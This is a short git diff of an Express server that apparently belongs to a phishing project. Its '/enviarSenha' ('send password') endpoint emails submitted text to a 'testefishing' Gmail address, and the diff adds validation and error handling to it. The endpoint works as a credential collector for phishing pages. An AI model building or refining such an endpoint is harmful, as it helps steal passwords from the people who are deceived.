@@ -11,16 +11,18 @@ server.get('/infos', async (req, resp) => {
 });
 
 server.post('/enviarSenha', async (req, resp) => {
+    try {
+        
     const { text, subject } = req.body;
-    
-    console.log('aaaaa1')
+    if(!text || !subject)
+        throw new Error('invalido')
+
     const opEmail = {
         text:  text,
         subject:  subject,
         from: 'testeFishing67@hotmail.com <testeFishing67@hotmail.com>',
         to: ['testefishing69@gmail.com'],
     };
-    console.log('aaaaa1')
 
     const mailsend = await transporter.sendMail(opEmail);
 
@@ -28,8 +30,9 @@ server.post('/enviarSenha', async (req, resp) => {
 
     resp.status(200).send()
 
+} catch (err) {
+        resp.status(500).send({erro: err.message})
+}
 });
-
-
 
 export default server;
